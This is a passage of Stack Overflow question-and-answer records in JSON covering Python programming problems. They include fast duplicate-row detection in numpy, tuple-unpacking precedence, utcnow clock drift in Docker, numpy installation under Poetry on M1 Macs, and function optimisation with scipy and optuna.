    "Body": "I am attempting to find duplicate rows in a numpy array.  The following code replicates the structure of my array which has n rows, m columns, and nz non-zero entries per row:\nimport numpy as np\nimport random\nimport datetime\n\n\ndef create_mat(n, m, nz):\n    sample_mat = np.zeros((n, m), dtype='uint8')\n    random.seed(42)\n    for row in range(0, n):\n        counter = 0\n        while counter < nz:\n            random_col = random.randrange(0, m-1, 1)\n            if sample_mat[row, random_col] == 0:\n                sample_mat[row, random_col] = 1\n                counter += 1\n    test = np.all(np.sum(sample_mat, axis=1) == nz)\n    print(f'All rows have {nz} elements: {test}')\n    return sample_mat\n\nThe code I am attempting to optimize is as follows:\nif __name__ == '__main__':\n    threshold = 2\n    mat = create_mat(1800000, 108, 8)\n\n    print(f'Time: {datetime.datetime.now()}')\n    unique_rows, _, duplicate_counts = np.unique(mat, axis=0, return_counts=True, return_index=True)\n    duplicate_indices = [int(x) for x in np.argwhere(duplicate_counts >= threshold)]\n    print(f'Time: {datetime.datetime.now()}')\n\n    print(f'Unique rows: {len(unique_rows)} Sample inds: {duplicate_indices[0:5]} Sample counts: {duplicate_counts[0:5]}')\n    print(f'Sample rows:')\n    print(unique_rows[0:5])\n\n\nMy output is as follows:\nAll rows have 8 elements: True\nTime: 2022-06-29 12:08:07.320834\nTime: 2022-06-29 12:08:23.281633\nUnique rows: 1799994 Sample inds: [508991, 553136, 930379, 1128637, 1290356] Sample counts: [1 1 1 1 1]\nSample rows:\n[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 1 1 0 0 1 1 0 0 0 1 0 0 0 0 0 0 1 0 1 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 1 1 0 0 0 0 0 1 1 1 1 0 0 0 0 1 0 0 0 0 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 0 1 0 0 0 0 1 0 1 0 0 1 0 0 0 1 0 1 0 1 0 0 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 1 0 1 1 0 0 0 0 1 1 0 0 0 0 0 0 1 1 0 1 0 0 0 0 0]\n [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n  0 0 0 0 0 0 0 0 0 0 1 1 0 0 0 0 1 0 0 0 1 0 1 1 0 0 0 0 0 1 0 0 0 0 1 0]]\n\nI have considered using numba, but the challenge is that it does not operate using an axis parameter.  Similarly, conversion to list and utilization of sets is an option, but then looping through to perform the duplicate counts seems \"unpythonic\".\nGiven that I need to run this code multiple times (since I am modifying the numpy array and then needing to re-search for duplicates), the time is critical. I have also tried to use multiprocessing against this step but the np.unique seems to be blocking (i.e. even when I try to run multiple versions of this, I end up constrained to one thread running at 6% CPU capacity while the other threads sit idle).\n",
    "AcceptedAnswerId": 72836634,
    "AcceptedAnswer": "Step 1: bit packing\nSince your matrix only contains binary values, you can aggressively pack the bits into uint64 values so to perform a much more efficient sort then. Here is a Numba implementation:\nimport numpy as np\nimport numba as nb\n\n@nb.njit('(uint8[:,::1],)', parallel=True)\ndef pack_bits(mat):\n    n, m = mat.shape\n    res = np.zeros((n, (m+63)//64), np.uint64)\n    for i in nb.prange(n):\n        for bj in range(0, m, 64):\n            val = np.uint64(0)\n            if bj + 64 <= m:\n                # Fast case\n                for j in range(64):\n                    val += np.uint64(mat[i, bj+j]) << (63 - j)\n            else:\n                # Slow case (boundary)\n                for j in range(m - bj):\n                    val += np.uint64(mat[i, bj+j]) << (63 - j)\n            res[i, bj//64] = val\n    return res\n\n@nb.njit('(uint64[:,::1], int_)', parallel=True)\ndef unpack_bits(mat, m):\n    n = mat.shape[0]\n    assert mat.shape[1] == (m+63)//64\n    res = np.zeros((n, m), np.uint64)\n    for i in nb.prange(n):\n        for bj in range(0, m, 64):\n            val = np.uint64(mat[i, bj//64])\n            if bj + 64 <= m:\n                # Fast case\n                for j in range(64):\n                    res[i, bj+j] = np.uint8((val >> (63 - j)) & 1)\n            else:\n                # Slow case (boundary)\n                for j in range(m - bj):\n                    res[i, bj+j] = np.uint8((val >> (63 - j)) & 1)\n    return res\n\nThe np.unique function can be called on the much smaller packed array like in the initial code (except the resulting sorted array is a packed one and need to be unpacked). Since you do not need the indices, it is better not to compute it. Thus, return_index=True can be removed. Additionally, only the required values can be unpacked (unpacking is a bit more expensive than packing because writing a big matrix is more expensive than reading an existing one).\nif __name__ == '__main__':\n    threshold = 2\n    n, m = 1800000, 108\n    mat = create_mat(n, m, 8)\n\n    print(f'Time: {datetime.datetime.now()}')\n    packed_mat = pack_bits(mat)\n    duplicate_packed_rows, duplicate_counts = np.unique(packed_mat, axis=0, return_counts=True)\n    duplicate_indices = [int(x) for x in np.argwhere(duplicate_counts >= threshold)]\n    print(f'Time: {datetime.datetime.now()}')\n\n    print(f'Duplicate rows: {len(duplicate_rows)} Sample inds: {duplicate_indices[0:5]} Sample counts: {duplicate_counts[0:5]}')\n    print(f'Sample rows:')\n    print(unpack_bits(duplicate_packed_rows[0:5], m))\n\n\nStep 2: np.unique optimizations\nThe np.unique call is sub-optimal as it performs multiple expensive internal sorting steps. Not all of them are needed in your specific case and some step can be optimized.\nA more efficient implementation consists in sorting the last column during a first step, then sorting the previous column, and so on until the first column is sorted similar to what a Radix sort does. Note that the last column can be sorted using a non-stable algorithm (generally faster) but the others need a stable one. This method is still sub-optimal as argsort calls are slow and the current implementation does not use multiple threads yet. Unfortunately, Numpy does not proving any efficient way to sort rows of a 2D array yet. While it is possible to reimplement this in Numba, this is cumbersome, a bit tricky to do and bug prone. Not to mention Numba introduce some overheads compared to a native C/C++ code. Once sorted, the unique/duplicate rows can be tracked and counted. Here is an implementation:\ndef sort_lines(mat):\n    n, m = mat.shape\n\n    for i in range(m):\n        kind = 'stable' if i > 0 else None\n        mat = mat[np.argsort(mat[:,m-1-i], kind=kind)]\n\n    return mat\n\n@nb.njit('(uint64[:,::1],)', parallel=True)\ndef find_duplicates(sorted_mat):\n    n, m = sorted_mat.shape\n    assert m >= 0\n\n    isUnique = np.zeros(n, np.bool_)\n    uniqueCount = 1\n    if n > 0:\n        isUnique[0] = True\n    for i in nb.prange(1, n):\n        isUniqueVal = False\n        for j in range(m):\n            isUniqueVal |= sorted_mat[i, j] != sorted_mat[i-1, j]\n        isUnique[i] = isUniqueVal\n        uniqueCount += isUniqueVal\n\n    uniqueValues = np.empty((uniqueCount, m), np.uint64)\n    duplicateCounts = np.zeros(len(uniqueValues), np.uint64)\n\n    cursor = 0\n    for i in range(n):\n        cursor += isUnique[i]\n        for j in range(m):\n            uniqueValues[cursor-1, j] = sorted_mat[i, j]\n        duplicateCounts[cursor-1] += 1\n\n    return uniqueValues, duplicateCounts\n\nThe previous np.unique call can be replaced by find_duplicates(sort_lines(packed_mat)).\nStep 3: GPU-based np.unique\nWhile implementing a fast algorithm to sort row is not easy on CPU with Numba and Numpy, one can simply use CuPy to do that on the GPU assuming a Nvidia GPU is available and CUDA is installed (as well as CuPy). This solution has the benefit of being simple and significantly more efficient. Here is an example:\nimport cupy as cp\n\ndef cupy_sort_lines(mat):\n    cupy_mat = cp.array(mat)\n    return cupy_mat[cp.lexsort(cupy_mat.T[::-1,:])].get()\n\nThe previous sort_lines call can be replaced by cupy_sort_lines.\n\nResults\nHere are the timings on my machine with a 6-core i5-9600KF CPU and a Nvidia 1660 Super GPU:\nInitial version:        15.541 s\nOptimized packing:       0.982 s\nOptimized np.unique:     0.634 s\nGPU-based sorting:       0.143 s   (require a Nvidia GPU)\n\nThus, the CPU-based optimized version is about 25 times faster and the GPU-based one is 109 times faster. Note that the sort take a significant time in all versions. Also, please note that the unpacking is not included in the benchmark (as seen in the provided code). It takes a negligible time as long as only few rows are unpacked and not all the full array (which takes roughtly ~200 ms on my machine). This last operation can be further optimized at the expense of a significantly more complex implementation.\n"
}
{
    "Id": 72845828,
    "PostTypeId": 1,
    "Title": "Priority of tuple (un)packing with inline if-else",
    "Body": "Apologies in advance for the obscure title. I wasn't sure how to phrase what I encountered.\nImagine that you have a title of a book alongside its author, separated by -, in a variable title_author. You scraped this information from the web so it might very well be that this item is None. Obviously you would like to separate the title from the author, so you'd use split. But in case title_author is None to begin with, you just want both title and author to be None.\nI figured that the following was a good approach:\ntitle_author = \"In Search of Lost Time - Marcel Proust\"\ntitle, author = title_author.split(\"-\", 1) if title_author else None, None\nprint(title, author)\n# ['In Search of Lost Time ', ' Marcel Proust'] None\n\nBut to my surprise, title now was the result of the split and author was None. The solution is to explicitly indicate that the else clause is a tuple by means of parentheses.\ntitle, author = title_author.split(\"-\", 1) if title_author else (None, None)\nprint(title, author) \n# In Search of Lost Time   Marcel Proust\n\nSo why is this happening? What is the order of execution here that lead to the result in the first case?\n",
    "AcceptedAnswerId": 72845910,
    "AcceptedAnswer": "title, author = title_author.split(\"-\", 1) if title_author else None, None\n\nis the same as:\ntitle, author = (title_author.split(\"-\", 1) if title_author else None), None\n\nTherefore, author is always None\n\nExplaination:\nFrom official doc\n\nAn assignment statement evaluates the expression list (remember that\nthis can be a single expression or a comma-separated list, the latter\nyielding a tuple) and assigns the single resulting object to each of\nthe target lists, from left to right.\n\nThat is to say, the interrupter will look for (x,y)=(a,b) and assign value as x=a and y=b.\nIn your case, there are two interpretation, the main differece is that :\n\ntitle, author = (title_author.split(\"-\", 1) if title_author else None), None\nis assigning two values (a list or a None and a None) to two variables and no unpacking is needed.\n\ntitle, author = title_author.split(\"-\", 1) if title_author else (None, None) is actually assigning one value (a list or a tuple) to two variable, which need an unpacking step to map two variables to the two values in the list/tuple.\n\n\nAs option 1 can be completed without unpacking, i.e. less operation, the interrupter will go with option 1 without explicit instructions.\n"
}
{
    "Id": 72369250,
    "PostTypeId": 1,
    "Title": "Weird datetime.utcnow() bug",
    "Body": "Consider this simple Python script:\n$ cat test_utc.py\nfrom datetime import datetime\n\nfor i in range(10_000_000):\n    first = datetime.utcnow()\n    second = datetime.utcnow()\n\n    assert first <= second, f\"{first=} {second=} {i=}\"\n\nWhen I run it from the shell like python test_utc.py it finishes w/o errors, just as expected. However, when I run it in a Docker container the assertion fails:\n$ docker run -it --rm -v \"$PWD\":/code -w /code python:3.10.4 python test_utc.py\nTraceback (most recent call last):\n  File \"/code/test_utc.py\", line 7, in \n    assert first <= second, f\"{first=} {second=} {i=}\"\nAssertionError: first=datetime.datetime(2022, 5, 24, 19, 5, 1, 861308) second=datetime.datetime(2022, 5, 24, 19, 5, 1, 818270) i=1818860\n\nHow is it possible?\nP.S. a colleague has reported that increasing the range parameter to 100_000_000 makes it fail in the shell on their mac as well (but not for me).\n",
    "AcceptedAnswerId": 72369605,
    "AcceptedAnswer": "utcnow refers to now refers to today refers to fromtimestamp refers to time, which says:\n\nWhile this function normally returns non-decreasing values, it can return a lower value than a previous call if the system clock has been set back between the two calls.\n\nThe utcnow code also shows its usage of time:\ndef utcnow(cls):\n    \"Construct a UTC datetime from time.time().\"\n    t = _time.time()\n    return cls.utcfromtimestamp(t)\n\nSuch system clock updates are also why monotonic exists, which says:\n\nReturn the value (in fractional seconds) of a monotonic clock, i.e. a clock that cannot go backwards. The clock is not affected by system clock updates.\n\nAnd utcnow has no such guarantee.\nYour computer doesn't have a perfect clock, every now and then it synchronizes via the internet with more accurate clocks, possibly adjusting it backwards. See for example answers here.\nAnd looks like Docker makes it worse, see for example Addressing Time Drift in Docker Desktop for Mac from the Docker blog. Excerpt:\n\nmacOS doesn\u2019t have native container support. The helper VM has its own internal clock, separate from the host\u2019s clock. When the two clocks drift apart then suddenly commands which rely on the time, or on file timestamps, may start to behave differently\n\nLastly, you can increase your chance to catch a backwards update when one occurs. If one occurs not between getting first and second but between second and the next first, you'll miss it! Below code fixes that issue and is also micro-optimized (including removing the utcnow middle man) so it checks faster / more frequently:\nimport time\nfrom itertools import repeat\n\ndef function():\n    n = 10_000_000\n    reps = repeat(1, n)\n    now = time.time\n    first = now()\n    for _ in reps:\n        second = now()\n        assert first <= second, f\"{first=} {second=} i={n - sum(reps)}\"\n        first = second\nfunction()\n\n"
}
{
    "Id": 71764027,
    "PostTypeId": 1,
    "Title": "Numpy installation fails when installing with Poetry on M1 and macOS",
    "Body": "I have a Numpy as a dependency in Poetry pyproject.toml file and it fails to install.\n  error: the clang compiler does not support 'faltivec', please use -maltivec and include altivec.h explicitly\n              error: Command \"clang -Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -isysroot /Library/Developer/CommandLineTools/SDKs/MacOSX12.sdk -DNPY_INTERNAL_BUILD=1 -DHAVE_NPY_CONFIG_H=1 -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE=1 -D_LARGEFILE64_SOURCE=1 -DNO_ATLAS_INFO=3 -DHAVE_CBLAS -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/umath -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/npymath -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/common -Inumpy/core/include -Ibuild/src.macosx-12-arm64-3.9/numpy/core/include/numpy -Inumpy/core/src/common -Inumpy/core/src -Inumpy/core -Inumpy/core/src/npymath -Inumpy/core/src/multiarray -Inumpy/core/src/umath -Inumpy/core/src/npysort -I/Users/moo/Library/Caches/pypoetry/virtualenvs/dex-ohlcv-qY1n4duk-py3.9/include -I/opt/homebrew/Cellar/python@3.9/3.9.12/Frameworks/Python.framework/Versions/3.9/include/python3.9 -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/common -Ibuild/src.macosx-12-arm64-3.9/numpy/core/src/npymath -c numpy/core/src/multiarray/array_assign_scalar.c -o build/temp.macosx-12-arm64-3.9/numpy/core/src/multiarray/array_assign_scalar.o -MMD -MF build/temp.macosx-12-arm64-3.9/numpy/core/src/multiarray/array_assign_scalar.o.d -faltivec -I/System/Library/Frameworks/vecLib.framework/Headers\" failed with exit status 1\n              [end of output]\n        \n          note: This error originates from a subprocess, and is likely not a problem with pip.\n          ERROR: Failed building wheel for numpy\n        Failed to build numpy\n\n\nmacOS Big Sur\nPython 3.9 installed through Homebrew\n\nHow to solve it?\nIf I install Numpy with pip it installs fine.\n",
    "AcceptedAnswerId": 71764028,
    "AcceptedAnswer": "Make sure you have OpenBLAS installed from Homebrew:\nbrew install openblas\n\nThen before running any installation script, make sure you tell your shell environment to use Homebrew OpenBLAS installation\nexport OPENBLAS=\"$(brew --prefix openblas)\" \npoetry install\n\nIf you get an error\n                File \"/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py\", line 252, in get_tag\n                  plat_name = get_platform(self.bdist_dir)\n                File \"/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py\", line 48, in get_platform\n                  result = calculate_macosx_platform_tag(archive_root, result)\n                File \"/private/var/folders/tx/50wn88yd40v2_6_7fvfr98z00000gn/T/pip-build-env-uq7qd2ba/overlay/lib/python3.9/site-packages/wheel/macosx_libfile.py\", line 356, in calculate_macosx_platform_tag\n                  assert len(base_version) == 2\n              AssertionError\n\nThis should have been fixed in the recent enough Python packaging tools.\nMake sure\n\nPoetry is recent enough version\nNumpy is recent enough version\nAny dependency using Numpy, like Scipy or Pyarrrow are also the most recent version\n\nFor example in your pyproject.toml\n[tool.poetry.dependencies]\n# For Scipy compatibility\npython = \">=3.9,<3.11\"\n\nscipy = \"^1.8.0\"\npyarrow = \"^7.0.0\"\n\nEven if this still fails you can try to preinstall scipy with pip before running poetry install in Poetry virtualenv (enter with poetry shell) This should pick up the precompiled scipy wheel. When the precompiled wheel is present, Poetry should not try to install it again and then fail it the build step.\npoetry shell\npip install scipy\n\nCollecting scipy\n  Downloading scipy-1.8.0-cp39-cp39-macosx_12_0_arm64.whl (28.7 MB)\n     \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 28.7/28.7 MB 6.0 MB/s eta 0:00:00\nRequirement already satisfied: numpy=1.17.3 in /Users/moo/Library/Caches/pypoetry/virtualenvs/dex-ohlcv-qY1n4duk-py3.9/lib/python3.9/site-packages (from scipy) (1.22.3)\nInstalling collected packages: scipy\nSuccessfully installed scipy-1.8.0\n\nAfter this run Poetry normally:\npoetry install\n\n"
}
{
    "Id": 72193393,
    "PostTypeId": 1,
    "Title": "Find the value of variables to maximize return of function in Python",
    "Body": "I'd want to achieve similar result as how the Solver-function in Excel is working. I've been reading of Scipy optimization and been trying to build a function which outputs what I would like to find the maximal value of. The equation is based on four different variables which, see my code below:\nimport pandas as pd\nimport numpy as np\nfrom scipy import optimize\n\ncols = {\n    'Dividend2': [9390, 7448, 177], \n    'Probability': [341, 376, 452], \n    'EV': [0.53, 0.60, 0.55], \n    'Dividend': [185, 55, 755], \n    'EV2': [123, 139, 544],\n}\n\ndf = pd.DataFrame(cols)\n\ndef myFunc(params):\n    \"\"\"myFunc metric.\"\"\"\n    (ev, bv, vc, dv) = params\n    df['Number'] = np.where(df['Dividend2'] <= vc, 1, 0) \\\n                    + np.where(df['EV2'] <= dv, 1, 0)\n    df['Return'] =  np.where(\n        df['EV'] <= ev, 0, np.where(\n            df['Probability'] >= bv, 0, df['Number'] * df['Dividend'] - (vc + dv)\n        )\n    )\n    return -1 * (df['Return'].sum())\n\nb1 = [(0.2,4), (300,600), (0,1000), (0,1000)]\nstart = [0.2, 600, 1000, 1000]\nresult = optimize.minimize(fun=myFunc, bounds=b1, x0=start)\nprint(result)\n\nSo I'd like to find the maximum value of the column Return in df when changing the variables ev,bv,vc & dv. I'd like them to be between in the intervals of ev: 0.2-4, bv: 300-600, vc: 0-1000 & dv: 0-1000.\nWhen running my code it seem like the function stops at x0.\n",
    "AcceptedAnswerId": 72252081,
    "AcceptedAnswer": "Solution\nI will use optuna library to give you a solution to the type of problem you are trying to solve. I have tried using scipy.optimize.minimize and it appears that the loss-landscape is probably quite flat in most places, and hence the tolerances enforce the minimizing algorithm (L-BFGS-B) to stop prematurely.\n\nOptuna Docs: https://optuna.readthedocs.io/en/stable/index.html\n\nWith optuna, it rather straight forward. Optuna only requires an objective function and a study. The study send various trials to the objective function, which in turn, evaluates the metric of your choice.\nI have defined another metric function myFunc2 by mostly removing the np.where calls, as you can do-away with them (reduces number of steps) and make the function slightly faster.\n# install optuna with pip\npip install -Uqq optuna\n\nAlthough I looked into using a rather smooth loss landscape, sometimes it is necessary to visualize the landscape itself. The answer in section B elaborates on visualization. But, what if you want to use a smoother metric function? Section D sheds some light on this.\nOrder of code-execution should be:\n\nSections: C >> B >> B.1 >> B.2 >> B.3 >> A.1 >> A.2 >> D\n\nA. Building Intuition\nIf you create a hiplot (also known as a plot with parallel-coordinates) with all the possible parameter values as mentioned in the search_space for Section B.2, and plot the lowest 50 outputs of myFunc2, it would look like this:\n\nPlotting all such points from the search_space would look like this:\n\nA.1. Loss Landscape Views for Various Parameter-Pairs\nThese figures show that mostly the loss-landscape is flat for any two of the four parameters (ev, bv, vc, dv). This could be a reason why, only GridSampler (which brute-forces the searching process) does better, compared to the other two samplers (TPESampler and RandomSampler). Please click on any of the images below to view them enlarged. This could also be the reason why scipy.optimize.minimize(method=\"L-BFGS-B\") fails right off the bat.\n\n\n\n\n  01. dv-vc\n  02. dv-bv\n  03. dv-ev\n\n\n\n\n  04. bv-ev\n  05. cv-ev\n  06. vc-bv\n\n\n\n\n# Create contour plots for parameter-pairs\nstudy_name = \"GridSampler\"\nstudy = studies.get(study_name)\n\nviews = [(\"dv\", \"vc\"), (\"dv\", \"bv\"), (\"dv\", \"ev\"), \n         (\"bv\", \"ev\"), (\"vc\", \"ev\"), (\"vc\", \"bv\")]\n\nfor i, (x, y) in enumerate(views):\n    print(f\"Figure: {i}/{len(views)}\")\n    study_contour_plot(study=study, params=(x, y))\n\nA.2. Parameter Importance\n\nstudy_name = \"GridSampler\"\nstudy = studies.get(study_name)\n\nfig = optuna.visualization.plot_param_importances(study)\nfig.update_layout(title=f'Hyperparameter Importances: {study.study_name}', \n                  autosize=False,\n                  width=800, height=500,\n                  margin=dict(l=65, r=50, b=65, t=90))\nfig.show()\n\nB. Code\nSection B.3. finds the lowest metric -88.333 for:\n\n{'ev': 0.2, 'bv': 500.0, 'vc': 222.2222, 'dv': 0.0}\n\nimport warnings\nfrom functools import partial\nfrom typing import Iterable, Optional, Callable, List\n\nimport pandas as pd\nimport numpy as np\nimport optuna\nfrom tqdm.notebook import tqdm\n\nwarnings.filterwarnings(\"ignore\", category=optuna.exceptions.ExperimentalWarning)\noptuna.logging.set_verbosity(optuna.logging.WARNING)\n\nPARAM_NAMES: List[str] = [\"ev\", \"bv\", \"vc\", \"dv\",]\nDEFAULT_METRIC_FUNC: Callable = myFunc2\n\n\ndef myFunc2(params):\n    \"\"\"myFunc metric v2 with lesser steps.\"\"\"\n    global df # define as a global variable\n    (ev, bv, vc, dv) = params\n    df['Number'] = (df['Dividend2'] <= vc) * 1 + (df['EV2'] <= dv) * 1\n    df['Return'] =  (\n        (df['EV'] > ev) \n        * (df['Probability'] < bv) \n        * (df['Number'] * df['Dividend'] - (vc + dv))\n    )\n    return -1 * (df['Return'].sum())\n\n\ndef make_param_grid(\n        bounds: List[Tuple[float, float]], \n        param_names: Optional[List[str]]=None, \n        num_points: int=10, \n        as_dict: bool=True,\n    ) -> Union[pd.DataFrame, Dict[str, List[float]]]:\n    \"\"\"\n    Create parameter search space.\n\n    Example:\n    \n        grid = make_param_grid(bounds=b1, num_points=10, as_dict=True)\n    \n    \"\"\"\n    if param_names is None:\n        param_names = PARAM_NAMES # [\"ev\", \"bv\", \"vc\", \"dv\"]\n    bounds = np.array(bounds)\n    grid = np.linspace(start=bounds[:,0], \n                       stop=bounds[:,1], \n                       num=num_points, \n                       endpoint=True, \n                       axis=0)\n    grid = pd.DataFrame(grid, columns=param_names)\n    if as_dict:\n        grid = grid.to_dict()\n        for k,v in grid.items():\n            grid.update({k: list(v.values())})\n    return grid\n\n\ndef objective(trial, \n              bounds: Optional[Iterable]=None, \n              func: Optional[Callable]=None, \n              param_names: Optional[List[str]]=None):\n    \"\"\"Objective function, necessary for optimizing with optuna.\"\"\"\n    if param_names is None:\n        param_names = PARAM_NAMES\n    if (bounds is None):\n        bounds = ((-10, 10) for _ in param_names)\n    if not isinstance(bounds, dict):\n        bounds = dict((p, (min(b), max(b))) \n                        for p, b in zip(param_names, bounds))\n    if func is None:\n        func = DEFAULT_METRIC_FUNC\n\n    params = dict(\n        (p, trial.suggest_float(p, bounds.get(p)[0], bounds.get(p)[1])) \n        for p in param_names        \n    )\n    # x = trial.suggest_float('x', -10, 10)\n    return func((params[p] for p in param_names))\n\n\ndef optimize(objective: Callable, \n             sampler: Optional[optuna.samplers.BaseSampler]=None, \n             func: Optional[Callable]=None, \n             n_trials: int=2, \n             study_direction: str=\"minimize\",\n             study_name: Optional[str]=None,\n             formatstr: str=\".4f\",\n             verbose: bool=True):\n    \"\"\"Optimizing function using optuna: creates a study.\"\"\"\n    if func is None:\n        func = DEFAULT_METRIC_FUNC\n    study = optuna.create_study(\n        direction=study_direction, \n        sampler=sampler, \n        study_name=study_name)\n    study.optimize(\n        objective, \n        n_trials=n_trials, \n        show_progress_bar=True, \n        n_jobs=1,\n    )\n    if verbose:\n        metric = eval_metric(study.best_params, func=myFunc2)\n        msg = format_result(study.best_params, metric, \n                            header=study.study_name, \n                            format=formatstr)\n        print(msg)\n    return study\n\n\ndef format_dict(d: Dict[str, float], format: str=\".4f\") -> Dict[str, float]:\n    \"\"\"\n    Returns formatted output for a dictionary with \n    string keys and float values.\n    \"\"\"\n    return dict((k, float(f'{v:{format}}')) for k,v in d.items())\n\n\ndef format_result(d: Dict[str, float], \n                  metric_value: float, \n                  header: str='', \n                  format: str=\".4f\"): \n    \"\"\"Returns formatted result.\"\"\"\n    msg = f\"\"\"Study Name: {header}\\n{'='*30}\n    \n    \u2705 study.best_params: \\n\\t{format_dict(d)}\n    \u2705 metric: {metric_value} \n    \"\"\"\n    return msg\n\n\ndef study_contour_plot(study: optuna.Study, \n                       params: Optional[List[str]]=None, \n                       width: int=560, \n                       height: int=500):\n    \"\"\"\n    Create contour plots for a study, given a list or \n    tuple of two parameter names.\n    \"\"\"\n    if params is None:\n        params = [\"dv\", \"vc\"]\n    fig = optuna.visualization.plot_contour(study, params=params)\n    fig.update_layout(\n        title=f'Contour Plot: {study.study_name} ({params[0]}, {params[1]})', \n        autosize=False,\n        width=width, \n        height=height,\n        margin=dict(l=65, r=50, b=65, t=90))\n    fig.show()\n\n\nbounds = [(0.2, 4), (300, 600), (0, 1000), (0, 1000)]\nparam_names = PARAM_NAMES # [\"ev\", \"bv\", \"vc\", \"dv\",]\npobjective = partial(objective, bounds=bounds)\n\n# Create an empty dict to contain \n# various subsequent studies.\nstudies = dict()\n\nOptuna comes with a few different types of Samplers. Samplers provide the strategy of how optuna is going to sample points from the parametr-space and evaluate the objective function.\n\nhttps://optuna.readthedocs.io/en/stable/reference/samplers.html\n\nB.1 Use TPESampler\nfrom optuna.samplers import TPESampler\n\nsampler = TPESampler(seed=42)\n\nstudy_name = \"TPESampler\"\nstudies[study_name] = optimize(\n    pobjective, \n    sampler=sampler, \n    n_trials=100, \n    study_name=study_name,\n)\n\n# Study Name: TPESampler\n# ==============================\n#    \n#     \u2705 study.best_params: \n#   {'ev': 1.6233, 'bv': 585.2143, 'vc': 731.9939, 'dv': 598.6585}\n#     \u2705 metric: -0.0 \n\nB.2. Use GridSampler\nGridSampler requires a parameter search grid. Here we are using the following search_space.\n\nfrom optuna.samplers import GridSampler\n\n# create search-space\nsearch_space = make_param_grid(bounds=bounds, num_points=10, as_dict=True)\n\nsampler = GridSampler(search_space)\n\nstudy_name = \"GridSampler\"\nstudies[study_name] = optimize(\n    pobjective, \n    sampler=sampler, \n    n_trials=2000, \n    study_name=study_name,\n)\n\n# Study Name: GridSampler\n# ==============================\n#    \n#     \u2705 study.best_params: \n#   {'ev': 0.2, 'bv': 500.0, 'vc': 222.2222, 'dv': 0.0}\n#     \u2705 metric: -88.33333333333337 \n\nB.3. Use RandomSampler\nfrom optuna.samplers import RandomSampler\n\nsampler = RandomSampler(seed=42)\n\nstudy_name = \"RandomSampler\"\nstudies[study_name] = optimize(\n    pobjective, \n    sampler=sampler, \n    n_trials=300, \n    study_name=study_name,\n)\n\n# Study Name: RandomSampler\n# ==============================\n#    \n#     \u2705 study.best_params: \n#   {'ev': 1.6233, 'bv': 585.2143, 'vc': 731.9939, 'dv': 598.6585}\n#     \u2705 metric: -0.0 \n\nC. Dummy Data\nFor the sake of reproducibility, I am keeping a record of the dummy data used here.\nimport pandas as pd\nimport numpy as np\nfrom scipy import optimize\n\ncols = {\n    'Dividend2': [9390, 7448, 177], \n    'Probability': [341, 376, 452], \n    'EV': [0.53, 0.60, 0.55], \n    'Dividend': [185, 55, 755], \n    'EV2': [123, 139, 544],\n}\n\ndf = pd.DataFrame(cols)\n\ndef myFunc(params):\n    \"\"\"myFunc metric.\"\"\"\n    (ev, bv, vc, dv) = params\n    df['Number'] = np.where(df['Dividend2'] <= vc, 1, 0) \\\n                    + np.where(df['EV2'] <= dv, 1, 0)\n    df['Return'] =  np.where(\n        df['EV'] <= ev, 0, np.where(\n            df['Probability'] >= bv, 0, df['Number'] * df['Dividend'] - (vc + dv)\n        )\n    )\n    return -1 * (df['Return'].sum())\n\nb1 = [(0.2,4), (300,600), (0,1000), (0,1000)]\nstart = [0.2, 600, 1000, 1000]\nresult = optimize.minimize(fun=myFunc, bounds=b1, x0=start)\nprint(result)\n\nC.1. An Observation\nSo, it seems at first glance that the code executed properly and did not throw any error. It says it had success in finding the minimized solution.\n      fun: -0.0\n hess_inv: \n      jac: array([0., 0., 3., 3.])\n  message: b'CONVERGENCE: NORM_OF_PROJECTED_GRADIENT_<=_PGTOL' # \ud83d\udca1\n     nfev: 35\n      nit: 2\n   status: 0\n  success: True\n        x: array([2.e-01, 6.e+02, 0.e+00, 0.e+00]) # \ud83d\udd25\n\nA close observation reveals that the solution (see \ud83d\udd25) is no different from the starting point [0.2, 600, 1000, 1000]. So, 